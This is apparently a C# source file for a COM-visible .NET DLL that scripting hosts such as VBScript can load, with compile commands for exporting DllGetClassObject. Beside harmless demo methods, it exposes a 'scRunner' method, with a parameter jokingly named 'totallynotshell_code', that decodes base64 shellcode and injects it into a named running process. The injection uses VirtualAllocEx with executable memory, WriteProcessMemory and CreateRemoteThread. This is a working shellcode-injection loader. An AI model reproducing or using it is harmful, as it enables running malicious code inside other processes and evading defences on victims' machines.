using System;
using System.IO;
using System.Dynamic;
using System.ComponentModel;
using System.Reflection;
using System.Runtime.InteropServices;
using System.Collections.Generic;


/*
C:\Windows\Microsoft.NET\Framework\v4.0.30319\csc.exe /target:library export.cs
"C:\Program Files (x86)\Microsoft SDKs\Windows\v10.0A\bin\NETFX 4.8 Tools\ildasm.exe" export.dll  /out=export.il
C:\Windows\Microsoft.NET\Framework\v4.0.30319\ilasm.exe /DLL /X64 export.il
*/



[Guid("F35D5D5D-4A3C-4042-AC35-CE0C57AF8383")]
[InterfaceType(ComInterfaceType.InterfaceIsIDispatch)]
[ComVisible(true)]
public interface IDynamicWrapperDotNet
{
	
	string getValue1(string sParameter);
	void getValue3();
	string getValue2();
	dynamic dynamo();
	void AddProperty(string propertyName, object propertyValue);
	void scRunner(string s, string procName);
	
}

//https://gist.github.com/jjeffery/1568627
[Guid("00000001-0000-0000-c000-000000000046")]
[InterfaceType(ComInterfaceType.InterfaceIsIUnknown)]
[ComImport]
internal interface IClassFactory
{
	void CreateInstance([MarshalAs(UnmanagedType.IUnknown)] object pUnkOuter, ref Guid riid, [MarshalAs(UnmanagedType.IUnknown)] out object ppvObject);
	void LockServer(bool fLock);
}

[ComVisible(true)]
[ClassInterface(ClassInterfaceType.None)]
[Guid("185FAAFF-9A8A-41B4-809A-CA6EEAA95D61")]
[ProgId("DynamicWrapperDotNet")]
public class DynamicWrapperDotNet : MarshalByRefObject, IDynamicWrapperDotNet, IClassFactory 
{
	public dynamic _dynamo = new System.Dynamic.ExpandoObject();
	
	public string getValue1(string sParameter)
	{
	 switch (sParameter)
	 {
		 case "a":
		 return "A was chosen";

		 case "b":
		 return "B was chosen";

		 case "c":
		 return "C was chosen";

		 default:
		 return "Other";
		}	
	}
	
	[ComVisible(true)]
	public string getValue2()
	{
	return "From VBS String Function";
	}

	[ComVisible(true)]
	public void getValue3()
	{
			System.Windows.Forms.MessageBox.Show("Hey From My Assembly");

	}
	
	[ComVisible(true)]
	public dynamic dynamo()
	{
		dynamic MyDynamic = new System.Dynamic.ExpandoObject();
		MyDynamic.A = "A";
		MyDynamic.B = "B";
		MyDynamic.C = "C";
		MyDynamic.Number = 12;
		MyDynamic.MyMethod = new Func<int>(() => 
		{ 
			return 55; 
		});
		Console.WriteLine(MyDynamic.MyMethod());
		return MyDynamic;
	}
	
	public void AddProperty( string propertyName, object propertyValue )
	{
		// ExpandoObject supports IDictionary so we can extend it like this
		ExpandoObject expando = this._dynamo;
		var expandoDict = expando as IDictionary<string, object>;
		if (expandoDict.ContainsKey(propertyName))
			expandoDict[propertyName] = propertyValue;
		else
			expandoDict.Add(propertyName, propertyValue);
	}
	
	public void scRunner(string totallynotshell_code, string processName)
	{
		TestClass tc = new TestClass();
		tc.Inject(totallynotshell_code,processName);
	}
	
	public static uint DllGetClassObject(Guid rclsid, Guid riid, out IntPtr ppv)
	{
		// We will expport this	
		ppv = IntPtr.Zero;

		try
		{
			if (riid.CompareTo(Guid.Parse("00000001-0000-0000-c000-000000000046")) == 0)
			{
				//Call to DllClassObject is requesting IClassFactory.
				var instance = new DynamicWrapperDotNet();
				IntPtr iUnk = Marshal.GetIUnknownForObject(instance);
				//return instance;
				Marshal.QueryInterface(iUnk, ref riid, out ppv);
				return 0;
			}
			else
				return 0x80040111; //CLASS_E_CLASSNOTAVAILABLE
		}
		catch
		{
			return 0x80040111; //CLASS_E_CLASSNOTAVAILABLE
		}        
		
	}

	public void CreateInstance([MarshalAs(UnmanagedType.IUnknown)] object pUnkOuter, ref Guid riid, [MarshalAs(UnmanagedType.IUnknown)] out object ppvObject)
	{
		IntPtr ppv = IntPtr.Zero;

		//http://stackoverflow.com/a/13355702/864414
		AppDomainSetup domaininfo = new AppDomainSetup();
		domaininfo.ApplicationBase = @"C:\Tools\TNT";
		var curDomEvidence = AppDomain.CurrentDomain.Evidence;
		AppDomain newDomain = AppDomain.CreateDomain("MyDomain", curDomEvidence, domaininfo);

		Type type = typeof(DynamicWrapperDotNet);
		var instance = newDomain.CreateInstanceAndUnwrap(
			   type.Assembly.FullName,
			   type.FullName);

		ppvObject = instance;
	}

	public void LockServer(bool fLock)
	{
		//Do nothing
	}
	
	
	
}

class ExampleClass
{
    public ExampleClass() { }
    public ExampleClass(int v) { }

    public void exampleMethod1(int i) { }

    public void exampleMethod2(string str) { }
}


public class TestClass
{
	
	public TestClass()
	{}
	
    [DllImport("kernel32.dll")]
    public static extern IntPtr OpenProcess(int dwDesiredAccess, bool bInheritHandle, int dwProcessId);

    [DllImport("kernel32.dll", CharSet = CharSet.Auto)]
    public static extern IntPtr GetModuleHandle(string lpModuleName);

    [DllImport("kernel32", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
    static extern IntPtr GetProcAddress(IntPtr hModule, string procName);

    [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
    static extern IntPtr VirtualAllocEx(IntPtr hProcess, IntPtr lpAddress,
        uint dwSize, uint flAllocationType, uint flProtect);

    [DllImport("kernel32.dll", SetLastError = true)]
    static extern bool WriteProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, byte[] lpBuffer, uint nSize, out UIntPtr lpNumberOfBytesWritten);

    [DllImport("kernel32.dll")]
    static extern IntPtr CreateRemoteThread(IntPtr hProcess,
        IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);

    const int PROCESS_CREATE_THREAD = 0x0002;
    const int PROCESS_QUERY_INFORMATION = 0x0400;
    const int PROCESS_VM_OPERATION = 0x0008;
    const int PROCESS_VM_WRITE = 0x0020;
    const int PROCESS_VM_READ = 0x0010;

   
    const uint MEM_COMMIT = 0x00001000;
    const uint MEM_RESERVE = 0x00002000;
    const uint PAGE_READWRITE = 4;
	const uint PAGE_EXECUTE_READWRITE = 0x40;

    public int Inject(string s, string procName)
    {
       
		byte[] shellcode = Convert.FromBase64String(s);
		
        System.Diagnostics.Process targetProcess = System.Diagnostics.Process.GetProcessesByName(procName)[0];
		Console.WriteLine(targetProcess.Id);

        IntPtr procHandle = OpenProcess(PROCESS_CREATE_THREAD | PROCESS_QUERY_INFORMATION | PROCESS_VM_OPERATION | PROCESS_VM_WRITE | PROCESS_VM_READ, false, targetProcess.Id);

        IntPtr allocMemAddress = VirtualAllocEx(procHandle, IntPtr.Zero, (uint)shellcode.Length, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);

        
        UIntPtr bytesWritten;
        WriteProcessMemory(procHandle, allocMemAddress, shellcode, (uint)shellcode.Length , out bytesWritten);

        CreateRemoteThread(procHandle, IntPtr.Zero, 0, allocMemAddress, IntPtr.Zero , 0, IntPtr.Zero);

        return 0;
    }
}
